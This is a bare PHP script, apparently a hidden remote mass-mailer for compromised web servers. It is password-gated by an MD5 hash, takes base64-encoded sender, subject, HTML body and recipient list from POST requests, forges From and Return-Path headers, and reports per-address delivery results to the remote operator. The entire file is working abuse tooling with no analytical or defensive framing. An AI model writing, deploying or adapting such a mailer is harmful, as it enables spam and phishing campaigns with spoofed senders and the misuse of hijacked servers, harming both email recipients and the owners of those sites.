<?php

if(!isset($_POST['passwd'])||md5($_POST['passwd'])!='f99565791ffce0529dda71ef6ae4e478')
	exit;
$action = 'send';
$from = base64_decode($_POST['from']);
$realname = base64_decode($_POST['realname']);
$subject = base64_decode($_POST['subject']);
$message = base64_decode($_POST['message']);
$emaillist = base64_decode($_POST['emaillist']);
echo 'mailer,';

if ($action=="send"){
	$message = urlencode($message);
	$message = ereg_replace("%5C%22", "%22", $message);
	$message = urldecode($message);
	$message = stripslashes($message);
	$subject = stripslashes($subject);
}

if ($action=="send"){

	if (!$from && !$subject && !$message && !$emaillist){
	echo "Please complete all fields before sending your message.";
	exit;
	}
	
	$allemails = split(",", $emaillist);
	$numemails = count($allemails);
	
	for($x=0; $x<$numemails; $x++){
		$to = $allemails[$x];
		if ($to){
		$to = ereg_replace(" ", "", $to);
		$message = ereg_replace("&email&", $to, $message);
		$subject = ereg_replace("&email&", $to, $subject);
                $nrmail=$x+1;
		$domain = substr($from, strpos($from, "@"), strlen($from));

		$header = "From: $realname <$from>\r\n";
//		$header .= "Message-Id: <130746$numemails.$nrmail$domain>\r\n";
                $header .= "Return-Path: ".$from."\r\n";
		$header .= "MIME-Version: 1.0\r\n";
		$header .= "Content-Type: text/html\r\n";
		$header .= "Content-Transfer-Encoding: 8bit\r\n\r\n";
		$header .= "$message\r\n";
		//echo $header;
		if(@mail($to, $subject, "", $header,'-f'.$from))
			echo "OK!".$to;
		else
			echo "ERROR!".$to;
		echo ',';
		}
		}

}
